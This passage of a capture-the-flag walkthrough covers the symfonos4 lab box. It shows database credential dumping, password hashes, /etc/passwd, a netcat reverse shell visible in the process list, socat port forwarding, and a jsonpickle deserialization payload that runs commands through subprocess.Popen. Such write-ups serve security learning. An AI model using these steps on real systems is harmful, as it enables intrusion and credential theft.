+<span id="cb45-14"><a href="#cb45-14" aria-hidden="true"></a>   <span class="kw">$results</span> = <span class="kw">$statement</span>-&gt;fetch<span class="ot">(</span><span class="kw">PDO</span>::<span class="kw">FETCH_ASSOC</span><span class="ot">);</span></span>
+<span id="cb45-15"><a href="#cb45-15" aria-hidden="true"></a>   <span class="kw">if</span> <span class="ot">(</span><span class="kw">isset</span><span class="ot">(</span><span class="kw">$results</span><span class="ot">[</span><span class="st">&quot;pwd&quot;</span><span class="ot">]))</span>{</span>
+<span id="cb45-16"><a href="#cb45-16" aria-hidden="true"></a>       <span class="kw">$_SESSION</span><span class="ot">[</span><span class="st">&#39;logged_in&#39;</span><span class="ot">]</span> = <span class="kw">$username</span><span class="ot">;</span></span>
+<span id="cb45-17"><a href="#cb45-17" aria-hidden="true"></a>       <span class="fu">header</span><span class="ot">(</span><span class="st">&quot;Location: sea.php&quot;</span><span class="ot">);</span></span>
+<span id="cb45-18"><a href="#cb45-18" aria-hidden="true"></a>   } <span class="kw">else</span> {</span>
+<span id="cb45-19"><a href="#cb45-19" aria-hidden="true"></a>        <span class="kw">$_SESSION</span><span class="ot">[</span><span class="st">&quot;logged_in&quot;</span><span class="ot">]</span> = <span class="kw">false</span><span class="ot">;</span></span>
+<span id="cb45-20"><a href="#cb45-20" aria-hidden="true"></a>        <span class="fu">sleep</span><span class="ot">(</span><span class="dv">2</span><span class="ot">);</span> <span class="co">// Don&#39;t brute force :(</span></span>
+<span id="cb45-21"><a href="#cb45-21" aria-hidden="true"></a>        <span class="kw">echo</span> <span class="st">&quot;&lt;br /&gt;&lt;center&gt;Incorrect login&lt;/center&gt;&quot;</span><span class="ot">;</span></span>
+<span id="cb45-22"><a href="#cb45-22" aria-hidden="true"></a>   } }</span>
+<span id="cb45-23"><a href="#cb45-23" aria-hidden="true"></a><span class="kw">?&gt;</span></span>
+<span id="cb45-24"><a href="#cb45-24" aria-hidden="true"></a>&lt;html&gt;</span>
+<span id="cb45-25"><a href="#cb45-25" aria-hidden="true"></a>&lt;head&gt;</span>
+<span id="cb45-26"><a href="#cb45-26" aria-hidden="true"></a>&lt;<span class="fu">link</span> rel=<span class="st">&quot;stylesheet&quot;</span> type=<span class="st">&quot;text/css&quot;</span> href=<span class="st">&quot;css/bootstrap.min.css&quot;</span>&gt;</span>
+<span id="cb45-27"><a href="#cb45-27" aria-hidden="true"></a>&lt;/head&gt;</span>
+<span id="cb45-28"><a href="#cb45-28" aria-hidden="true"></a>&lt;body&gt;&lt;br /&gt;</span>
+<span id="cb45-29"><a href="#cb45-29" aria-hidden="true"></a>&lt;main <span class="kw">class</span>=<span class="st">&quot;login-form&quot;</span>&gt;</span>
+<span id="cb45-30"><a href="#cb45-30" aria-hidden="true"></a>    &lt;div <span class="kw">class</span>=<span class="st">&quot;cotainer&quot;</span>&gt;</span>
+<span id="cb45-31"><a href="#cb45-31" aria-hidden="true"></a>        &lt;div <span class="kw">class</span>=<span class="st">&quot;row justify-content-center&quot;</span>&gt;</span>
+<span id="cb45-32"><a href="#cb45-32" aria-hidden="true"></a>            &lt;div <span class="kw">class</span>=<span class="st">&quot;col-md-8&quot;</span>&gt;</span>
+<span id="cb45-33"><a href="#cb45-33" aria-hidden="true"></a>                &lt;div <span class="kw">class</span>=<span class="st">&quot;card&quot;</span>&gt;</span>
+<span id="cb45-34"><a href="#cb45-34" aria-hidden="true"></a>                    &lt;div <span class="kw">class</span>=<span class="st">&quot;card-header&quot;</span>&gt;Login&lt;/div&gt;</span>
+<span id="cb45-35"><a href="#cb45-35" aria-hidden="true"></a>                    &lt;div <span class="kw">class</span>=<span class="st">&quot;card-body&quot;</span>&gt;</span>
+<span id="cb45-36"><a href="#cb45-36" aria-hidden="true"></a>                        &lt;form action=<span class="st">&quot;atlantis.php&quot;</span> method=<span class="st">&quot;post&quot;</span>&gt;</span>
+<span id="cb45-37"><a href="#cb45-37" aria-hidden="true"></a>                            &lt;div <span class="kw">class</span>=<span class="st">&quot;form-group row&quot;</span>&gt;</span>
+<span id="cb45-38"><a href="#cb45-38" aria-hidden="true"></a>                                &lt;label <span class="kw">for</span>=<span class="st">&quot;username&quot;</span> <span class="kw">class</span>=<span class="st">&quot;col-md-4 col-form-label text-md-right&quot;</span>&gt;Username&lt;/label&gt;</span>
+<span id="cb45-39"><a href="#cb45-39" aria-hidden="true"></a>                                &lt;div <span class="kw">class</span>=<span class="st">&quot;col-md-6&quot;</span>&gt;</span>
+<span id="cb45-40"><a href="#cb45-40" aria-hidden="true"></a>                                    &lt;input type=<span class="st">&quot;text&quot;</span> id=<span class="st">&quot;username&quot;</span> <span class="kw">class</span>=<span class="st">&quot;form-control&quot;</span> name=<span class="st">&quot;username&quot;</span> required autofocus&gt;</span>
+<span id="cb45-41"><a href="#cb45-41" aria-hidden="true"></a>                                &lt;/div&gt;</span>
+<span id="cb45-42"><a href="#cb45-42" aria-hidden="true"></a>                            &lt;/div&gt;</span>
+<span id="cb45-43"><a href="#cb45-43" aria-hidden="true"></a></span>
+<span id="cb45-44"><a href="#cb45-44" aria-hidden="true"></a>                            &lt;div <span class="kw">class</span>=<span class="st">&quot;form-group row&quot;</span>&gt;</span>
+<span id="cb45-45"><a href="#cb45-45" aria-hidden="true"></a>                                &lt;label <span class="kw">for</span>=<span class="st">&quot;password&quot;</span> <span class="kw">class</span>=<span class="st">&quot;col-md-4 col-form-label text-md-right&quot;</span>&gt;Password&lt;/label&gt;</span>
+<span id="cb45-46"><a href="#cb45-46" aria-hidden="true"></a>                                &lt;div <span class="kw">class</span>=<span class="st">&quot;col-md-6&quot;</span>&gt;</span>
+<span id="cb45-47"><a href="#cb45-47" aria-hidden="true"></a>                                    &lt;input type=<span class="st">&quot;password&quot;</span> id=<span class="st">&quot;password&quot;</span> <span class="kw">class</span>=<span class="st">&quot;form-control&quot;</span> name=<span class="st">&quot;password&quot;</span> required&gt;</span>
+<span id="cb45-48"><a href="#cb45-48" aria-hidden="true"></a>                                &lt;/div&gt;</span>
+<span id="cb45-49"><a href="#cb45-49" aria-hidden="true"></a>                            &lt;/div&gt;</span>
+<span id="cb45-50"><a href="#cb45-50" aria-hidden="true"></a></span>
+<span id="cb45-51"><a href="#cb45-51" aria-hidden="true"></a>                            &lt;div <span class="kw">class</span>=<span class="st">&quot;col-md-6 offset-md-4&quot;</span>&gt;</span>
+<span id="cb45-52"><a href="#cb45-52" aria-hidden="true"></a>                                &lt;button type=<span class="st">&quot;submit&quot;</span> <span class="kw">class</span>=<span class="st">&quot;btn btn-primary&quot;</span>&gt;</span>
+<span id="cb45-53"><a href="#cb45-53" aria-hidden="true"></a>                                    Login</span>
+<span id="cb45-54"><a href="#cb45-54" aria-hidden="true"></a>                                &lt;/button&gt;</span>
+<span id="cb45-55"><a href="#cb45-55" aria-hidden="true"></a>                            &lt;/div&gt;</span>
+<span id="cb45-56"><a href="#cb45-56" aria-hidden="true"></a>                    &lt;/div&gt;</span>
+<span id="cb45-57"><a href="#cb45-57" aria-hidden="true"></a>                    &lt;/form&gt;</span>
+<span id="cb45-58"><a href="#cb45-58" aria-hidden="true"></a>                &lt;/div&gt;</span>
+<span id="cb45-59"><a href="#cb45-59" aria-hidden="true"></a>            &lt;/div&gt;</span>
+<span id="cb45-60"><a href="#cb45-60" aria-hidden="true"></a>        &lt;/div&gt;</span>
+<span id="cb45-61"><a href="#cb45-61" aria-hidden="true"></a>    &lt;/div&gt;</span>
+<span id="cb45-62"><a href="#cb45-62" aria-hidden="true"></a>    &lt;/div&gt;</span>
+<span id="cb45-63"><a href="#cb45-63" aria-hidden="true"></a>&lt;/main&gt;</span>
+<span id="cb45-64"><a href="#cb45-64" aria-hidden="true"></a></span>
+<span id="cb45-65"><a href="#cb45-65" aria-hidden="true"></a>&lt;/body&gt;</span>
+<span id="cb45-66"><a href="#cb45-66" aria-hidden="true"></a>&lt;/html&gt;</span></code></pre></div>
+<h3 id="mysql">mysql</h3>
+<pre class="shell"><code>www-data@symfonos4:/var/www/html$ mysql -uroot -pyVzyRGw3cG2Uyt2r
+mysql -uroot -pyVzyRGw3cG2Uyt2r
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 15
+Server version: 10.3.15-MariaDB-1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+
+MariaDB [(none)]&gt; show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| db                 |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.005 sec)
+
+MariaDB [(none)]&gt; use db;
+use db;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [db]&gt; show tables;
+show tables;
++--------------+
+| Tables_in_db |
++--------------+
+| users        |
++--------------+
+1 row in set (0.000 sec)
+
+MariaDB [db]&gt; desc users;
+desc users;
++----------+------+------+-----+---------+-------+
+| Field    | Type | Null | Key | Default | Extra |
++----------+------+------+-----+---------+-------+
+| username | text | YES  |     | NULL    |       |
+| pwd      | text | YES  |     | NULL    |       |
++----------+------+------+-----+---------+-------+
+2 rows in set (0.004 sec)
+
+MariaDB [db]&gt; select * from users;
+select * from users;
++----------+------------------------------------------------------------------+
+| username | pwd                                                              |
++----------+------------------------------------------------------------------+
+| admin    | b674f184cd52edabf2c38c0142452c0af7e21f71e857cebb856e3ad7714b99f2 |
++----------+------------------------------------------------------------------+
+1 row in set (0.001 sec)
+
+MariaDB [db]&gt; show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| db                 |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.001 sec)
+
+MariaDB [db]&gt; use mysql
+use mysql
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [mysql]&gt; show tables;
+show tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| column_stats              |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| gtid_slave_pos            |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| index_stats               |
+| innodb_index_stats        |
+| innodb_table_stats        |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| roles_mapping             |
+| servers                   |
+| slow_log                  |
+| table_stats               |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| transaction_registry      |
+| user                      |
++---------------------------+
+31 rows in set (0.002 sec)
+
+MariaDB [mysql]&gt; desc user;
+desc user;
++------------------------+-----------------------------------+------+-----+----------+-------+
+| Field                  | Type                              | Null | Key | Default  | Extra |
++------------------------+-----------------------------------+------+-----+----------+-------+
+| Host                   | char(60)                          | NO   | PRI |          |       |
+| User                   | char(80)                          | NO   | PRI |          |       |
+| Password               | char(41)                          | NO   |     |          |       |
+| Select_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Insert_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Update_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Delete_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Create_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Drop_priv              | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Reload_priv            | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Shutdown_priv          | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Process_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| File_priv              | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Grant_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| References_priv        | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Index_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Alter_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Show_db_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Super_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Create_tmp_table_priv  | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Lock_tables_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Execute_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Repl_slave_priv        | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Repl_client_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Create_view_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Show_view_priv         | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Create_routine_priv    | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Alter_routine_priv     | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Create_user_priv       | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Event_priv             | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Trigger_priv           | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Create_tablespace_priv | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| Delete_history_priv    | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| ssl_type               | enum(&#39;&#39;,&#39;ANY&#39;,&#39;X509&#39;,&#39;SPECIFIED&#39;) | NO   |     |          |       |
+| ssl_cipher             | blob                              | NO   |     | NULL     |       |
+| x509_issuer            | blob                              | NO   |     | NULL     |       |
+| x509_subject           | blob                              | NO   |     | NULL     |       |
+| max_questions          | int(11) unsigned                  | NO   |     | 0        |       |
+| max_updates            | int(11) unsigned                  | NO   |     | 0        |       |
+| max_connections        | int(11) unsigned                  | NO   |     | 0        |       |
+| max_user_connections   | int(11)                           | NO   |     | 0        |       |
+| plugin                 | char(64)                          | NO   |     |          |       |
+| authentication_string  | text                              | NO   |     | NULL     |       |
+| password_expired       | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| is_role                | enum(&#39;N&#39;,&#39;Y&#39;)                     | NO   |     | N        |       |
+| default_role           | char(80)                          | NO   |     |          |       |
+| max_statement_time     | decimal(12,6)                     | NO   |     | 0.000000 |       |
++------------------------+-----------------------------------+------+-----+----------+-------+
+47 rows in set (0.002 sec)
+
+MariaDB [mysql]&gt; select User, Password from user;
+select User, Password from user;
++------+-------------------------------------------+
+| User | Password                                  |
++------+-------------------------------------------+
+| root | *C82E87B34FBDE65D16D0C96AF84410AA160D81ED |
++------+-------------------------------------------+
+1 row in set (0.001 sec)
+
+MariaDB [mysql]&gt; exit
+exit
+Bye</code></pre>
+<p>Found credentials:</p>
+<ul>
+<li><code>admin:b674f184cd52edabf2c38c0142452c0af7e21f71e857cebb856e3ad7714b99f2</code></li>
+<li><code>root:*C82E87B34FBDE65D16D0C96AF84410AA160D81ED</code></li>
+</ul>
+<p>These however, don’t look like anything I have seen, admin one at least look like base 36 or something.</p>
+<h3 id="etcpasswd">/etc/passwd</h3>
+<pre class="shell"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+poseidon:x:1000:1000:,,,:/home/poseidon:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
+mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false</code></pre>
+<pre class="shell"><code>cat /etc/passwd | grep /home
+poseidon:x:1000:1000:,,,:/home/poseidon:/bin/bash</code></pre>
+<h3 id="processes">processes</h3>
+<pre class="shell"><code>www-data@symfonos4:/home/poseidon$ ps -ef
+ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 01:43 ?        00:00:01 /sbin/init
+root         2     0  0 01:43 ?        00:00:00 [kthreadd]
+root         3     2  0 01:43 ?        00:00:00 [rcu_gp]
+root         4     2  0 01:43 ?        00:00:00 [rcu_par_gp]
+root         6     2  0 01:43 ?        00:00:00 [kworker/0:0H-kblockd]
+root         8     2  0 01:43 ?        00:00:00 [mm_percpu_wq]
+root         9     2  0 01:43 ?        00:00:00 [ksoftirqd/0]
+root        10     2  0 01:43 ?        00:00:00 [rcu_sched]
+root        11     2  0 01:43 ?        00:00:00 [rcu_bh]
+root        12     2  0 01:43 ?        00:00:00 [migration/0]
+root        13     2  0 01:43 ?        00:00:01 [kworker/0:1-memcg_kmem_cache]
+root        14     2  0 01:43 ?        00:00:00 [cpuhp/0]
+root        15     2  0 01:43 ?        00:00:00 [kdevtmpfs]
+root        16     2  0 01:43 ?        00:00:00 [netns]
+root        17     2  0 01:43 ?        00:00:00 [kauditd]
+root        18     2  0 01:43 ?        00:00:00 [khungtaskd]
+root        19     2  0 01:43 ?        00:00:00 [oom_reaper]
+root        20     2  0 01:43 ?        00:00:00 [writeback]
+root        21     2  0 01:43 ?        00:00:00 [kcompactd0]
+root        22     2  0 01:43 ?        00:00:00 [ksmd]
+root        23     2  0 01:43 ?        00:00:00 [khugepaged]
+root        24     2  0 01:43 ?        00:00:00 [crypto]
+root        25     2  0 01:43 ?        00:00:00 [kintegrityd]
+root        26     2  0 01:43 ?        00:00:00 [kblockd]
+root        27     2  0 01:43 ?        00:00:00 [edac-poller]
+root        28     2  0 01:43 ?        00:00:00 [devfreq_wq]
+root        29     2  0 01:43 ?        00:00:00 [watchdogd]
+root        30     2  0 01:43 ?        00:00:00 [kswapd0]
+root        48     2  0 01:43 ?        00:00:00 [kthrotld]
+root        49     2  0 01:43 ?        00:00:00 [ipv6_addrconf]
+root        50     2  0 01:43 ?        00:00:00 [kworker/u2:1-events_unbound]
+root        59     2  0 01:43 ?        00:00:00 [kstrp]
+root       102     2  0 01:43 ?        00:00:00 [ata_sff]
+root       107     2  0 01:43 ?        00:00:00 [scsi_eh_0]
+root       109     2  0 01:43 ?        00:00:00 [scsi_tmf_0]
+root       111     2  0 01:43 ?        00:00:00 [scsi_eh_1]
+root       113     2  0 01:43 ?        00:00:00 [scsi_tmf_1]
+root       114     2  0 01:43 ?        00:00:00 [scsi_eh_2]
+root       116     2  0 01:43 ?        00:00:00 [kworker/u2:2-events_unbound]
+root       117     2  0 01:43 ?        00:00:00 [scsi_tmf_2]
+root       134     2  0 01:43 ?        00:00:00 [kworker/0:1H-kblockd]
+root       163     2  0 01:43 ?        00:00:00 [kworker/u3:0]
+root       165     2  0 01:43 ?        00:00:00 [jbd2/sda1-8]
+root       166     2  0 01:43 ?        00:00:00 [ext4-rsv-conver]
+root       195     1  0 01:43 ?        00:00:00 /lib/systemd/systemd-journald
+root       216     1  0 01:43 ?        00:00:00 /lib/systemd/systemd-udevd
+root       265     2  0 01:43 ?        00:00:00 [ttm_swap]
+root       267     2  0 01:43 ?        00:00:00 [irq/10-vmwgfx]
+systemd+   291     1  0 01:43 ?        00:00:00 /lib/systemd/systemd-timesyncd
+root       339     1  0 01:43 ?        00:00:00 /usr/sbin/cron -f
+root       340     1  0 01:43 ?        00:00:00 /usr/sbin/rsyslogd -n -iNONE
+root       341     1  0 01:43 ?        00:00:00 /lib/systemd/systemd-logind
+message+   342     1  0 01:43 ?        00:00:00 /usr/bin/dbus-daemon --system --
+root       346     1  0 01:43 ?        00:00:00 /sbin/wpa_supplicant -u -s -O /r
+root       362     1  0 01:43 ?        00:00:00 /sbin/dhclient -4 -v -i -pf /run
+root       397     1  0 01:43 ?        00:00:00 /usr/bin/python /usr/local/bin/g
+root       405     1  0 01:43 tty1     00:00:00 /sbin/agetty -o -p -- \u --nocle
+root       422     1  0 01:43 ?        00:00:00 /usr/sbin/sshd -D
+root       484     1  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+mysql      512     1  0 01:43 ?        00:00:02 /usr/sbin/mysqld
+root       543   397  0 01:43 ?        00:00:00 /usr/bin/python /usr/local/bin/g
+root       545   397  0 01:43 ?        00:00:00 /usr/bin/python /usr/local/bin/g
+root       560   397  0 01:43 ?        00:00:00 /usr/bin/python /usr/local/bin/g
+www-data   712   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   713   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   714   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   715   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   716   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   804   484  0 01:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   805   484  0 01:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   841   804  0 01:58 ?        00:00:00 sh -c nc -nv 192.168.56.70 443 -
+www-data   842   841  0 01:58 ?        00:00:00 sh
+www-data   848   842  0 01:59 ?        00:00:00 python -c import pty;pty.spawn(&quot;
+www-data   849   848  0 01:59 pts/0    00:00:00 /bin/bash
+root       851     2  0 01:59 ?        00:00:00 [kworker/0:0-ata_sff]
+root       863     2  0 02:04 ?        00:00:00 [kworker/0:2-ata_sff]
+www-data   874   849  0 02:08 pts/0    00:00:00 ps -ef
+www-data@symfonos4:/home/poseidon$ ps -ef | grep apache
+ps -ef | grep apache
+root       484     1  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   712   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   713   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   714   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   715   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   716   484  0 01:43 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   804   484  0 01:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   805   484  0 01:49 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data   876   849  0 02:08 pts/0    00:00:00 grep apache
+www-data@symfonos4:/home/poseidon$ ps -ef | grep python
+ps -ef | grep python
+root       397     1  0 01:43 ?        00:00:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app
+root       543   397  0 01:43 ?        00:00:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app
+root       545   397  0 01:43 ?        00:00:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app
+root       560   397  0 01:43 ?        00:00:00 /usr/bin/python /usr/local/bin/gunicorn --workers 3 -b 127.0.0.1:8080 app:app
+www-data   848   842  0 01:59 ?        00:00:00 python -c import pty;pty.spawn(&quot;/bin/bash&quot;)
+www-data   878   849  0 02:08 pts/0    00:00:00 grep python
+www-data@symfonos4:/home/poseidon$ ps -ef | grep ssh
+ps -ef | grep ssh
+root       422     1  0 01:43 ?        00:00:00 /usr/sbin/sshd -D
+www-data   880   849  0 02:08 pts/0    00:00:00 grep ssh
+www-data@symfonos4:/home/poseidon$ ps -ef | grep ftp
+ps -ef | grep ftp
+www-data   882   849  0 02:08 pts/0    00:00:00 grep ftp</code></pre>
+<p>Notice an app running at port 8080, we didn’t have it in nmap scans.</p>
+<h3 id="netstat">netstat</h3>
+<pre class="shell"><code>www-data@symfonos4:/home/poseidon$ netstat -antuple
+netstat -antuple
+bash: netstat: command not found
+www-data@symfonos4:/home/poseidon$ ss -ant
+ss -ant
+State  Recv-Q Send-Q          Local Address:Port             Peer Address:Port
+LISTEN 0      80                  127.0.0.1:3306                  0.0.0.0:*
+LISTEN 0      128                 127.0.0.1:8080                  0.0.0.0:*
+LISTEN 0      128                   0.0.0.0:22                    0.0.0.0:*
+ESTAB  0      0               192.168.56.93:41102           192.168.56.70:443
+LISTEN 0      128                         *:80                          *:*
+LISTEN 0      128                      [::]:22                       [::]:*
+ESTAB  0      0      [::ffff:192.168.56.93]:80     [::ffff:192.168.56.70]:53872</code></pre>
+<h2 id="port-forwarding">Port forwarding</h2>
+<p>I just realized that I am in a reverse shell via a webshell, and user is www-data. I cannot use SSH port forwarding.</p>
+<p><a href="https://unix.stackexchange.com/questions/293304/using-netcat-for-port-forwarding">Search if nc can port forward</a></p>
+<p><code>nc</code> cannot port forward.</p>
+<h3 id="socat"><code>socat</code></h3>
+<pre class="shell"><code>which socat
+/usr/bin/socat
+
+www-data@symfonos4:/home/poseidon$ socat tcp-listen:10000,fork,reuseaddr tcp:localhost:8080
+&lt; tcp-listen:10000,fork,reuseaddr tcp:localhost:8080</code></pre>
+<figure>
+<img src="10.forwarded-app.png" alt="" /><figcaption>10.forwarded-app</figcaption>
+</figure>
+<figure>
+<img src="11.forwarded-app-homepage.png" alt="" /><figcaption>11.forwarded-app-homepage</figcaption>
+</figure>
+<figure>
+<img src="12.new-cookie-set.png" alt="" /><figcaption>12.new-cookie-set</figcaption>
+</figure>
+<figure>
+<img src="13.both-of-the-terminals-are-stuck-lol.png" alt="" /><figcaption>13.both-of-the-terminals-are-stuck-lol</figcaption>
+</figure>
+<pre class="shell"><code>echo -n &quot;eyJweS9vYmplY3QiOiAiYXBwLlVzZXIiLCAidXNlcm5hbWUiOiAiUG9zZWlkb24ifQ==&quot; | base64 -d
+{&quot;py/object&quot;: &quot;app.User&quot;, &quot;username&quot;: &quot;Poseidon&quot;}</code></pre>
+<p>What do I do with this?</p>
+<h2 id="pyobject-exploit">py/object exploit</h2>
+<figure>
+<img src="14.search.png" alt="" /><figcaption>14.search https://www.google.com/search?q=py%2Fobject+exploit&amp;oq=&amp;aqs=</figcaption>
+</figure>
+<p><a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/">https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/</a></p>
+<p><a href="https://docs.python.org/3.4/library/pickle.html#module-pickle">python pickle</a></p>
+<figure>
+<img src="15.warning.png" alt="" /><figcaption>15.warning</figcaption>
+</figure>
+<p><a href="https://docs.python.org/3/library/pickle.html#module-pickle">latest python pickle: https://docs.python.org/3/library/pickle.html#module-pickle</a></p>
+<figure>
+<img src="16.warning-on-latest.png" alt="" /><figcaption>16.warning-on-latest</figcaption>
+</figure>
+<p>Basically, don’t deserialize data someone else gave you.</p>
+<pre class="shell"><code>echo -n &#39;{&quot;py/object&quot;: &quot;__main__.Shell&quot;, &quot;py/reduce&quot;: [{&quot;py/type&quot;: &quot;subprocess.Popen&quot;}, {&quot;py/tuple&quot;: [&quot;whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; date &quot;]}, null, null, null]}&#39; | base64
+eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6
+ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSAmJiBpZCAmJiBob3N0
+bmFtZSAmJiBkYXRlICJdfSwgbnVsbCwgbnVsbCwgbnVsbF19
+</code></pre>
+<pre class="shell"><code>echo -n &quot;eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6&quot; | base64 -d
+{&quot;py/object&quot;: &quot;__main__.Shell&quot;, &quot;py/reduce&quot;: [{&quot;py/type&quot;:</code></pre>
